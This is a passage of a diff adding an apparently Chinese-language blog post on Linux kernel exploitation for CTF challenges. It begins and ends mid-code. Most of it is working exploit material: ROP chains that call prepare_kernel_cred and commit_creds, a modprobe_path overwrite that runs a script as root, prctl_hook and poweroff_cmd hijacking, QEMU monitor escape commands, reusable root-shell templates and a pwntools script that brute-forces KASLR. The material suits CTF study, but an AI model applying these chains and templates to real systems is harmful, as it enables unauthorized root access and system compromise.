class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred_k;  </span><br><span class="line">rop[i++] = pop_rdx_rbx_rbp_ret;</span><br><span class="line">rop[i++] = pop_rbp_ret;</span><br><span class="line">rop[i++] = <span class="number">0x0</span>;      </span><br><span class="line">rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">rop[i++] = movRdiRax_call_rdx; </span><br><span class="line">rop[i++] = commit_creds_k;</span><br><span class="line">rop[i++] = swapgs_ret;              </span><br><span class="line">rop[i++] = iretq;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="②未开启SMEP情况"   >
+          <a href="#②未开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#②未开启SMEP情况" class="headerlink" title="②未开启SMEP情况"></a>②未开启SMEP情况</h4>
+      <p>直接调用用户空间的提权代码，返回之后起shell即可</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)</p>
+
+        <h2 id="3-常见提权手段"   >
+          <a href="#3-常见提权手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-常见提权手段" class="headerlink" title="3.常见提权手段"></a>3.常见提权手段</h2>
+      
+        <h3 id="修改modprobe-path"   >
+          <a href="#修改modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改modprobe-path" class="headerlink" title="修改modprobe_path"></a>修改modprobe_path</h3>
+      <p>这个设方法如果开启如下配置则不可用，表示<code>modprobe_path</code>为只读，不可修改</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//v4.11及之后存在</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>常常结合UAF漏洞来任意申请</p>
+<p>starctf2019-hackme–<a href="https://pig-007.github.io/2021/08/14/starctf2019-hackme/">starctf2019-hackme | PIG-007</a></p>
+<p>西湖论剑–easy_kernel–<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.crisprx.top/archives/495" >2021 西湖论剑 线上初赛 WP – Crispr –热爱技术和生活 (crisprx.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep modprobe_path</span><br></pre></td></tr></table></div></figure>
+
+<p>然后制作一个拷贝flag并且改权限的copy.sh文件，使得modprobe_path指向该文件，然后运行一个错误格式的文件，那么出错之后就会以root权限运行modprobe_path，从而以root权限运行我们的copy.sh，使得我们能够读取flag了。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="修改init-cred"   >
+          <a href="#修改init-cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改init-cred" class="headerlink" title="修改init_cred"></a>修改init_cred</h3>
+      <p>init进程是初始进程，不被动态分配，知道kernel基地址的时候，就能得到该结构体的地址。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms |grep init_cred</span><br></pre></td></tr></table></div></figure>
+
+<p>这种方法一般用在没办法修改到本进程的cred结构体的时候，之后使用即可提权</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pop_rdi_ret init_cred_addr commit_creds_addr即可</span></span><br><span class="line">commit_creds(&amp;init_cred)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="劫持prtcl-hook"   >
+          <a href="#劫持prtcl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#劫持prtcl-hook" class="headerlink" title="劫持prtcl_hook"></a>劫持prtcl_hook</h3>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost:4000/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/#3-%E5%8A%AB%E6%8C%81prctl%E5%87%BD%E6%95%B0" >pwnKernel从0开始(四) | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;orderly_poweroff-&gt;__orderly_poweroff-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br><span class="line"></span><br><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;poweroff_work_fun-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="1-劫持为orderly-poweroff函数"   >
+          <a href="#1-劫持为orderly-poweroff函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持为orderly-poweroff函数" class="headerlink" title="(1)劫持为orderly_poweroff函数"></a>(1)劫持为orderly_poweroff函数</h4>
+      <p>劫持该hook为orderly_poweroff函数，然后调用prctl函数即可操纵程序流进入<code>orderly_poweroff</code>函数，再劫持<code>poweroff_cmd</code>即可顺着<code>orderly_poweroff</code>函数来运行<code>call_usermodehelper(poweroff_cmd)</code>，该函数是以root权限运行，所以能够直接提权，不过一般运行一个反弹shell的程序。当然如果有KASLR就要爆破或者泄露了。</p>
+<p>最后需要执行<code>prctl(0,0)</code>；</p>
+
+        <h4 id="2-劫持为poweroff-work-fun函数"   >
+          <a href="#2-劫持为poweroff-work-fun函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-劫持为poweroff-work-fun函数" class="headerlink" title="(2)劫持为poweroff_work_fun函数"></a>(2)劫持为poweroff_work_fun函数</h4>
+      <p>与劫持<code>orderly_poweroff</code>函数同理，劫持为<code>poweroff_work_fun</code>函数也可以以root权限执行<code>poweroff_cmd</code></p>
+
+        <h4 id="3-获取地址"   >
+          <a href="#3-获取地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-获取地址" class="headerlink" title="(3)获取地址"></a>(3)获取地址</h4>
+      
+        <h5 id="①prctl-hook"   >
+          <a href="#①prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#①prctl-hook" class="headerlink" title="①prctl_hook"></a>①prctl_hook</h5>
+      <p>可以通过编写一个小程序，然后给<code>security_task_prctl</code>函数下断点，运行到<code>call QWORD PTR[rbx+0x18]</code>即可看到对应的rbx+0x18上存放的地址，即可获取到<code>prct_hook_addr</code>，劫持修改即可</p>
+
+        <h5 id="②poweroff-cmd、orderly-poweroff、poweroff-work-fun"   >
+          <a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="heading-link"><i class="fas fa-link"></i></a><a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="headerlink" title="②poweroff_cmd、orderly_poweroff、poweroff_work_fun"></a>②poweroff_cmd、orderly_poweroff、poweroff_work_fun</h5>
+      <p>poweroff_cmd是一个全局变量，可以直接获取地址然后修改。可以直接使用nm命令来获取，或者直接进入gdb打印即可。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png" alt="image-20211021105456058"></p>
+<p>此外orderly_poweroff也是一样的获取。如果无法查到，那么可以启动qemu，先设置为root权限后</p>
+<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>即可，或者编译一个对应版本的内核进行查询。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png" alt="image-20211021105603666"></p>
+<p><code>poweroff_work_fun</code>函数也是类似的获取方式</p>
+
+        <h1 id="七、意想不到的方式"   >
+          <a href="#七、意想不到的方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、意想不到的方式" class="headerlink" title="七、意想不到的方式"></a>七、意想不到的方式</h1>
+      
+        <h2 id="1-QEMU逃逸"   >
+          <a href="#1-QEMU逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-QEMU逃逸" class="headerlink" title="1.QEMU逃逸"></a>1.QEMU逃逸</h2>
+      <p>当没有关闭monitor时，可以直接ctrl+A C进去逃逸，解压rootfs.img读flag</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with id(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-权限配置问题"   >
+          <a href="#2-权限配置问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-权限配置问题" class="headerlink" title="2.权限配置问题"></a>2.权限配置问题</h2>
+      <p>有的根目录或者bin目录的所有者不是root时</p>
+
+        <h3 id="1-bin目录不为ROOT"   >
+          <a href="#1-bin目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-bin目录不为ROOT" class="headerlink" title="(1)bin目录不为ROOT"></a>(1)bin目录不为ROOT</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png" alt="image-20220302114830086"></p>
+<p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png" alt="image-20220302114945940"></p>
+
+        <h3 id="2-根目录不为ROOT"   >
+          <a href="#2-根目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-根目录不为ROOT" class="headerlink" title="(2)根目录不为ROOT"></a>(2)根目录不为ROOT</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png" alt="image-20220302115207278"></p>
+<p>那么在根目录下，虽然bin的所有者为root，但是缺可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv bin evil_bin</span><br><span class="line">mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h1 id="八、模板"   >
+          <a href="#八、模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、模板" class="headerlink" title="八、模板"></a>八、模板</h1>
+      
+        <h2 id="1-保存状态"   >
+          <a href="#1-保存状态" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-保存状态" class="headerlink" title="1.保存状态"></a>1.保存状态</h2>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-用户态起Shell"   >
+          <a href="#2-用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用户态起Shell" class="headerlink" title="2.用户态起Shell"></a>2.用户态起Shell</h2>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="3-返回用户态"   >
+          <a href="#3-返回用户态" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-返回用户态" class="headerlink" title="3.返回用户态"></a>3.返回用户态</h2>
+      
+        <h3 id="1-没有KPTI"   >
+          <a href="#1-没有KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-没有KPTI" class="headerlink" title="(1)没有KPTI"></a>(1)没有KPTI</h3>
+      <p>正常的swapgs和iretq</p>
+<p>ROP布局如下</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs_ret</span><br><span class="line">iretq</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-存在KPTI"   >
+          <a href="#2-存在KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-存在KPTI" class="headerlink" title="(2)存在KPTI"></a>(2)存在KPTI</h3>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>从<code>swapgs_restore_regs_and_return_to_usermode</code>函数某处开始执行</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    rsp,QWORD PTR gs:0x6004   //该处开始执行</span><br></pre></td></tr></table></div></figure>
+
+<p>ROP布局如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode+0x19,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="4-爆破KASLR"   >
+          <a href="#4-爆破KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-爆破KASLR" class="headerlink" title="4.爆破KASLR"></a>4.爆破KASLR</h2>
+      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="1-POC里"   >
+          <a href="#1-POC里" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-POC里" class="headerlink" title="(1)POC里"></a>(1)POC里</h3>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROP[i++] = POP_RDI_RET + offset;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">ROP[i++] = COMMIT_CREDS + offset;</span><br><span class="line">ROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-打远程的EXP"   >
+          <a href="#2-打远程的EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打远程的EXP" class="headerlink" title="(2)打远程的EXP"></a>(2)打远程的EXP</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="5-retUsr模板"   >
+          <a href="#5-retUsr模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-retUsr模板" class="headerlink" title="5.retUsr模板"></a>5.retUsr模板</h2>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));    <span class="comment">// 保存状态的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">status</span>;</span>     <span class="comment">// 保存状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将状态保存在status中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span>                  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %%ss, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsp, %1\n&quot;</span></span><br><span class="line">        <span 